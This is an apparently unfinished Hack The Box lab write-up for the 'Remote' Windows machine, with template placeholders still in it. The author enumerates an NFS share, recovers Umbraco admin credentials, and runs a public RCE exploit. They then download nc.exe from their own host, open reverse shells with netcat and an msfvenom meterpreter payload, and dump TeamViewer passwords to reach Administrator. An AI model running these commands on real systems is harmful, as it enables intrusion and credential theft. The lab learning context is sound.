
# HTB - Remote

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

#### Useful thing 1

description with generic example

#### Useful thing 2

description with generic example

## Enumeration

### Nmap scan

I started my enumeration of this machine with an nmap scan of `10.10.10.180`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all TCP ports, `-sC` runs a TCP connect scan, `-sV` does a service scan, `-oA <name>` saves all types of output \(`.nmap`,`.gnmap`, and `.xml`\) with filenames of `<name>`.

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-05 09:38 EDT
Nmap scan report for 10.10.10.180
Host is up (0.051s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  mountd        1-3 (RPC #100005)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m25s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-05T13:43:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.49 seconds
```

21/tcp   open  ftp
80/tcp   open  http
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

start with anonymous ftp login - empty folder

A search for umbraco+vulnerabilities = https://www.acunetix.com/vulnerabilities/web/umbraco-cms-remote-code-execution/

leads to http://10.10.10.180/umbraco/webservices/codeEditorSave.asmx <screenshot>

https://blog.gdssecurity.com/labs/2012/7/3/find-bugs-faster-with-a-webmatrix-local-reference-instance.html

rabbit hole?^

Dirbuster found a huge list of standard Umbraco directories and files

navigating to `/umbraco` redirects to a login page at http:10.10.10.180/umbraco/#/login.asp

https://our.umbraco.com/packages/developer-tools/umbraco-admin-reset/ - looks interesting, but didnt work

since rpc is open and showing mountd service: https://resources.infosecinstitute.com/exploiting-nfs-share
```
zweilos@kali:~/htb/remote$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)

zweilos@kali:~/htb/remote$ mkdir /tmp/remote
zweilos@kali:~/htb/remote$ sudo mount -t nfs 10.10.10.180:/site_backups /tmp/remote
zweilos@kali:~$ cd /tmp/remote
zweilos@kali:~$ df -k
Filesystem                 1K-blocks     Used Available Use% Mounted on
udev                         4033876        0   4033876   0% /dev
tmpfs                         812860     1156    811704   1% /run
/dev/sda1                   53407072 22346224  28318220  45% /
tmpfs                        4064284   341640   3722644   9% /dev/shm
tmpfs                           5120        0      5120   0% /run/lock
tmpfs                        4064284        0   4064284   0% /sys/fs/cgroup
tmpfs                         812856       28    812828   1% /run/user/1000
10.10.10.180:/site_backups  31119360 12312576  18806784  40% /tmp/remote
zweilos@kali:/tmp/remote$ ls -la                                                                     
total 123                                                                                               
drwx------  2 nobody 4294967294  4096 Feb 23 13:35 . 
drwxrwxrwt 25 root   root        4096 Jul  5 12:01 ..
drwx------  2 nobody 4294967294    64 Feb 20 12:16 App_Browsers
drwx------  2 nobody 4294967294  4096 Feb 20 12:17 App_Data
drwx------  2 nobody 4294967294  4096 Feb 20 12:16 App_Plugins
drwx------  2 nobody 4294967294    64 Feb 20 12:16 aspnet_client
drwx------  2 nobody 4294967294 49152 Feb 20 12:16 bin
drwx------  2 nobody 4294967294  8192 Feb 20 12:16 Config
drwx------  2 nobody 4294967294    64 Feb 20 12:16 css
-rwx------  1 nobody 4294967294   152 Nov  1  2018 default.aspx
-rwx------  1 nobody 4294967294    89 Nov  1  2018 Global.asax
drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Media
drwx------  2 nobody 4294967294    64 Feb 20 12:16 scripts
drwx------  2 nobody 4294967294  8192 Feb 20 12:16 Umbraco
drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Umbraco_Client
drwx------  2 nobody 4294967294  4096 Feb 20 12:16 Views
-rwx------  1 nobody 4294967294 28539 Feb 20 00:57 Web.config
```
file Web.config has line: <add key="umbracoConfigurationStatus" value="7.12.4" /> version number

https://our.umbraco.com/forum/developers/api-questions/8905-Where-does-Umbraco-store-data

App_Data/Ubmbraco.sdf

b8be16afba8c314ad33d812f22a04991b90e2aaa

admin@htb.local:baconandcheese

https://github.com/noraj/Umbraco-RCE

exploit.py
```
zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c whoami
iis apppool\defaultapppool
```
it works.  now time to enumerate the system (very slow however)

```
zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command ls'

    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                               
d-----        2/19/2020   3:11 PM                Config                                             
d-----        2/19/2020   3:11 PM                en                                                 
d-----        2/19/2020   3:11 PM                en-US                                              
d-----         7/5/2020   7:07 AM                History                                            
d-----        2/19/2020   3:11 PM                MetaBack                                           
...snipped...           
-a----        2/19/2020   3:11 PM         169984 XPath.dll
```
```
Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                               
d-----        2/19/2020   3:12 PM                .NET v2.0                                          
d-----        2/19/2020   3:12 PM                .NET v2.0 Classic                                  
d-----        2/19/2020   3:12 PM                .NET v4.5                                          
d-----        2/19/2020   3:12 PM                .NET v4.5 Classic                                  
d-----         7/5/2020   7:05 AM                Administrator                                      
d-----        2/19/2020   3:12 PM                Classic .NET AppPool                               
d-r---        2/20/2020   2:42 AM                Public
```
```
zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command ping 10.10.15.82'

Pinging 10.10.15.82 with 32 bytes of data:
Reply from 10.10.15.82: bytes=32 time=46ms TTL=63
Reply from 10.10.15.82: bytes=32 time=193ms TTL=63
Reply from 10.10.15.82: bytes=32 time=43ms TTL=63
Reply from 10.10.15.82: bytes=32 time=44ms TTL=63

Ping statistics for 10.10.15.82:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 43ms, Maximum = 193ms, Average = 81ms
```
## Initial Foothold
```
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a '-NoProfile -Command wget 10.10.15.82:8090/nc.exe -OutFile C:\\Windows\\Temp\\n.exe'
```
got a hit on my host
```
zweilos@kali:~$ python -m SimpleHTTPServer 8090
Serving HTTP on 0.0.0.0 port 8090 ...
10.10.10.180 - - [05/Jul/2020 20:28:42] "GET /nc32.exe HTTP/1.1" 200 -
```
once nc.exe was on the box could now get a shell with:
```
zweilos@kali:~/htb/remote$ python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'C:\\Windows\\Temp\\n.exe 10.10.15.82 9990 -e powershell.exe'
```


## Road to User

### Further enumeration

### Finding user creds
```
PS C:\> whoami /all
whoami /all

USER INFORMATION
----------------

User Name                  SID                                                          
========================== =============================================================
iis apppool\defaultapppool S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

ERROR: Unable to get user claims information.
```
not much

### User.txt
didnt realize for a long time that I already was logged in as "User"; I had to hunt for the flag which was in the `Public` user folder `C:\Users\Public`
```
PS C:\Users\Public> type user.txt
type user.txt
2224ec331009752bfb3d7409cef3e36a
```

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User <username>

```
PS C:\> [Environment]::OSVersion
[Environment]::OSVersion

Platform ServicePack Version      VersionString                    
-------- ----------- -------      -------------                    
 Win32NT             10.0.17763.0 Microsoft Windows NT 10.0.17763.0
```
32bit windows 10
teamviewer 7 installed, searching for exploit leads to https://whynotsecurity.com/blog/teamviewer/, there author has a python exploit, ~~need to compile to exe~~
search manually in registry with powershell: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-7
```
PS C:\Windows\Temp> Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\Teamviewer\Version7 
Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\Teamviewer\Version7


StartMenuGroup            : TeamViewer 7
InstallationDate          : 2020-02-20
InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
Always_Online             : 1
Security_ActivateDirectIn : 0
Version                   : 7.0.43148
ClientIC                  : 301094961
PK                        : {191, 173, 42, 237...}
SK                        : {248, 35, 152, 56...}
LastMACUsed               : {, 005056B9188D}
MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
MIDVersion                : 1
ClientID                  : 1769137322
CUse                      : 1
LastUpdateCheck           : 1584564540
UsageEnvironmentBackup    : 1
SecurityPasswordAES       : {255, 155, 28, 115...}
MultiPwdMgmtIDs           : {admin}
MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
Security_PasswordStrength : 3
PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Teamviewer\Vers
                            ion7
PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Teamviewer
PSChildName               : Version7
PSDrive                   : HKLM
PSProvider                : Microsoft.PowerShell.Core\Registry
```
using the python exploit to decrypt the password store in the reg key
```
zweilos@kali:~/htb/remote$ python3 teamviewer-pass.py 
00000000: 72 00 33 00 6D 00 30 00  74 00 65 00 5F 00 4C 00  r.3.m.0.t.e._.L.
00000010: 30 00 67 00 69 00 6E 00  00 00 00 00 00 00 00 00  0.g.i.n.........
None
r3m0te_L0gin
```
This password didn't seem to do me any good.  During research found a post exploit metasploit module that says it will find tv pass, I wanted to see if it was the same one.
https://www.rapid7.com/db/modules/post/windows/gather/credentials/teamviewer_passwords
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/post/windows/gather/credentials/teamviewer_passwords.md

> Any Windows host with a `meterpreter` session and `TeamViewer 7+` installed. 

So I will need a meterpreter session

### Getting a shell
```
zweilos@kali:~$ msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.15.82 LPORT=4444 -f exe -o rev.exe
```
sending msfvenom payload to remote system
```
python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a 'C:\\Windows\\Temp\\r.exe'
```
https://security.stackexchange.com/questions/133722/how-to-set-reverse-tcp-connection-when-doing-pentesting-in-vms
```
msf5 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.15.82
LHOST => 10.10.15.82
msf5 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.15.82:4444 
[*] Sending stage (176195 bytes) to 10.10.10.180
[*] Meterpreter session 1 opened (10.10.15.82:4444 -> 10.10.10.180:49711) at 2020-07-05 23:15:59 -0400

meterpreter > run post/windows/gather/credentials/teamviewer_passwords

[*] Finding TeamViewer Passwords on REMOTE
[+] Found Unattended Password: !R3m0te!
[+] Passwords stored in: /root/.msf4/loot/20200705232131_default_10.10.10.180_host.teamviewer__634180.txt
[*] <---------------- | Using Window Technique | ---------------->
[*] TeamViewer's language setting options are ''
[*] TeamViewer's version is ''
[-] Unable to find TeamViewer's process
```
!R3m0te! from meterpreter, different than before...maybe this one works to log in.

### Root.txt
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
ed57e228cd4d76d6987d89fae6d5a77d
```
Thanks to [`mrb3n`](https://www.hackthebox.eu/home/users/profile/2984) for <something interesting or useful about this machine.

If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
